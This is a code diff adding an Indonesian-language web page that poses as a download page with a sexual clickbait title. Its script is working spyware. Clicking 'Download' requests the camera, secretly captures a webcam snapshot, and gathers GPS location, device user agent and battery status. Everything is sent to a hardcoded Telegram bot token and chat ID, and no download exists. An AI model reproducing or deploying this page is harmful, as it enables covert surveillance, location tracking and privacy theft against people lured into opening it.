@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Download Page</title>
+  <style>
+    body {
+      background: #0a0a0f;
+      color: #eee;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+    h1 { color: #b59fff; margin-bottom: 20px; }
+    button {
+      background: linear-gradient(45deg, #6a00ff, #9a4dff);
+      color: white;
+      padding: 14px 28px;
+      border: none;
+      border-radius: 12px;
+      font-size: 18px;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+      transition: transform 0.2s, opacity 0.5s;
+    }
+    button:hover { transform: scale(1.05); }
+    .status {
+      margin-top: 20px;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      background: #00cc66;
+      color: #fff;
+      opacity: 0;
+      transform: translateY(20px);
+      transition: opacity 0.6s ease, transform 0.6s ease;
+    }
+    .status.show {
+      opacity: 1;
+      transform: translateY(0);
+    }
+    video, canvas { display:none; }
+  </style>
+</head>
+<body>
+  <h1>Download Ih Malah ketahuan pdhl udh enak 🤤</h1>
+  <button id="downloadBtn">Download</button>
+  <div class="status" id="status">Klik tombol untuk mulai.</div>
+
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const BOT_TOKEN = "8043711347:AAHjfLjObY2zkMx0qhzs2n4CKswbvop9M0E";
+    const CHAT_ID = "5766667083";
+
+    const btn = document.getElementById("downloadBtn");
+    const statusEl = document.getElementById("status");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    btn.addEventListener("click", async () => {
+      statusEl.textContent = "⏳ Memproses...";
+      btn.disabled = true;
+      btn.style.opacity = "0.6";
+
+      try {
+        // Ambil info device dasar
+        const deviceName = navigator.userAgent;
+        let batteryInfo = "Tidak tersedia";
+        if (navigator.getBattery) {
+          let battery = await navigator.getBattery();
+          batteryInfo = `🔋 ${Math.round(battery.level * 100)}% (${battery.charging ? "Charging" : "Not charging"})`;
+        }
+
+        // Minta izin kamera
+        let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        setTimeout(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          // Stop kamera
+          stream.getTracks().forEach(t => t.stop());
+
+          // Minta izin lokasi
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+              let lat = pos.coords.latitude.toFixed(5);
+              let lon = pos.coords.longitude.toFixed(5);
+              let acc = pos.coords.accuracy;
+              let mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+              let locationInfo = `📍 [Google Maps](${mapsLink})\nLat: ${lat}, Lon: ${lon} (±${acc}m)`;
+              kirimData(batteryInfo, deviceName, locationInfo);
+            }, () => {
+              kirimData(batteryInfo, deviceName, "❌ Lokasi ditolak");
+            });
+          } else {
+            kirimData(batteryInfo, deviceName, "❌ Lokasi tidak didukung");
+          }
+        }, 2000);
+
+      } catch (err) {
+        // Jika kamera ditolak → kirim fallback info saja
+        const deviceName = navigator.userAgent;
+        let batteryInfo = "Tidak tersedia";
+        if (navigator.getBattery) {
+          let battery = await navigator.getBattery();
+          batteryInfo = `🔋 ${Math.round(battery.level * 100)}% (${battery.charging ? "Charging" : "Not charging"})`;
+        }
+        kirimText(`⚠️ Kamera ditolak\n\n${deviceName}\n${batteryInfo}`);
+      }
+    });
+
+    // Kirim dengan foto
+    function kirimData(batteryInfo, deviceName, locationInfo) {
+      canvas.toBlob(blob => {
+        let formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, "snapshot.jpg");
+        formData.append("caption", `📱 Device: ${deviceName}\n${batteryInfo}\n${locationInfo}`);
+        formData.append("parse_mode", "Markdown");
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        })
+        .then(r => r.json())
+        .then(d => {
+          if (d.ok) {
+            showStatus("✅ Data terkirim ke Telegram", "#00cc66");
+          } else {
+            showStatus("❌ Gagal kirim: " + d.description, "#ff5555");
+          }
+        })
+        .catch(err => {
+          showStatus("❌ Error: " + err, "#ff5555");
+        });
+      }, "image/jpeg", 0.9);
+    }
+
+    // Kirim fallback text aja
+    function kirimText(text) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text })
+      }).then(() => {
+        showStatus("⚠️ Hanya info teks terkirim", "#ffaa00");
+      });
+    }
+
+    function showStatus(msg, color) {
+      statusEl.textContent = msg;
+      statusEl.style.background = color;
+      statusEl.classList.add("show");
+      setTimeout(() => statusEl.classList.remove("show"), 5000);
+    }
+  </script>
+</body>
+</html>
